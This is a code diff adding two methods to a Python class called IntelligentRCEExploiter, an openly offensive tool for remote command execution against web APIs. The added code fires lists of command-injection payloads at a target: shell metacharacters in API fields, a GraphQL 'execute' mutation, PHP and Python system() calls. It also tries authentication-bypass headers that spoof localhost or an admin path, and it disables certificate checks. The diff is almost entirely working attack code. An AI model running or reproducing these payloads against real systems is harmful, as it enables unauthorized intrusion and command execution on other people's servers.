@@ -497,6 +497,93 @@ class IntelligentRCEExploiter:
         
         return f"{Colors.RED}[-] Advanced exploitation failed: {endpoint}{Colors.END}"
     
+    def _exploit_advanced_rest_api(self, url: str, command: str) -> str:
+        """Advanced REST API exploitation techniques"""
+        print(f"{Colors.CYAN}[>] Attempting advanced REST API exploitation...{Colors.END}")
+    
+        # Enhanced REST API payloads
+        rest_payloads = [
+            # GraphQL injection
+            {"query": f'mutation {{ execute(command: "{command}") }}'},
+            {"query": f'{{ __schema {{ types {{ name }} }} }}', "variables": {"cmd": command}},
+        
+            # REST API command injection
+            {"filter": f"';{command};#"},
+            {"sort": f"$({{{command}}})"},
+            {"where": f"1; {command}"},
+        
+            # API parameter injection
+            {"api_key": f"test' && {command} #"},
+            {"token": f"test|{command}"},
+            {"auth": f"test`{command}`"},
+        
+            # JSON deep nesting
+            {"data": {"user": {"preferences": {"setting": command}}}},
+            {"config": {"debug": True, "command": command}},
+            {"options": {"exec": command, "run": True}},
+        
+            # Array-based injection
+            {"commands": [command, "ls", "pwd"]},
+            {"params": ["test", command, "debug"]},
+        
+            # Headers-based injection
+            {"X-Command": command, "X-Exec": command}
+        ]
+    
+       # Try different HTTP methods
+        methods = [
+            ('POST', {}),
+            ('PUT', {}),
+            ('PATCH', {}),
+            ('GET', {})
+        ]
+    
+        for payload in rest_payloads:
+            for method, headers in methods:
+                try:
+                    if method == 'POST':
+                        response = self.session.post(
+                            url,
+                            json=payload,
+                            headers=headers,
+                            timeout=5,
+                            verify=False
+                        )
+                    elif method == 'PUT':
+                        response = self.session.put(
+                            url,
+                            json=payload,
+                            headers=headers,
+                            timeout=5,
+                            verify=False
+                        )
+                    elif method == 'PATCH':
+                        response = self.session.patch(
+                            url,
+                            json=payload,
+                            headers=headers,
+                            timeout=5,
+                            verify=False
+                        )
+                    elif method == 'GET':
+                        # Convert payload to GET parameters
+                        params = "&".join([f"{k}={requests.utils.quote(str(v))}" for k, v in payload.items()])
+                        test_url = f"{url}?{params}" if params else url
+                        response = self.session.get(
+                            test_url,
+                            headers=headers,
+                            timeout=5,
+                            verify=False
+                        )
+                
+                    if self._is_successful_execution(response, command):
+                        return f"Advanced REST API ({method}): {response.text[:200]}"
+                    
+                except Exception as e:
+                    continue
+    
+        return None
+    
     def _exploit_advanced_json_rpc(self, url: str, command: str) -> str:
         """Advanced JSON-RPC exploitation"""
         advanced_payloads = [
@@ -527,6 +614,47 @@ class IntelligentRCEExploiter:
                     return f"JSON-RPC: {response.text}"
             except:
                 continue
+        return None
+        
+    def _exploit_rest_api_with_auth(self, url: str, command: str) -> str:
+        """REST API exploitation with authentication bypass attempts"""
+        print(f"{Colors.CYAN}[>] Attempting REST API with auth bypass...{Colors.END}")
+    
+        # Enhanced authentication bypass headers
+        auth_bypass_headers = [
+            {'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1'},
+            {'X-Original-URL': '/admin', 'X-Rewrite-URL': '/admin'},
+            {'User-Agent': 'Googlebot/2.1'},
+            {'Referer': 'http://127.0.0.1/admin'},
+            {'X-API-Key': 'test'},
+            {'Authorization': 'Bearer test'},
+            {'X-Auth-Token': 'test'}
+        ]
+    
+        enhanced_params = {
+            'command': command, 'cmd': command, 'exec': command,
+            'query': command, 'input': command, 'system': command,
+            'run': command, 'execute': command, 'shell': command,
+            'code': f'system("{command}");',
+            'data': f'<?php system("{command}"); ?>',
+            'script': f'print(os.system("{command}"))'
+        }
+    
+        for headers in auth_bypass_headers:
+            for param, value in enhanced_params.items():
+                try:
+                    response = self.session.post(
+                        url,
+                        data={param: value},
+                        headers=headers,
+                        timeout=3,
+                        verify=False
+                    )
+                    if self._is_successful_execution(response, command):
+                        return f"REST API with Auth Bypass: {response.text[:200]}"
+                except:
+                    continue
+    
         return None
     
     def _exploit_deserialization(self, url: str, command: str) -> str:
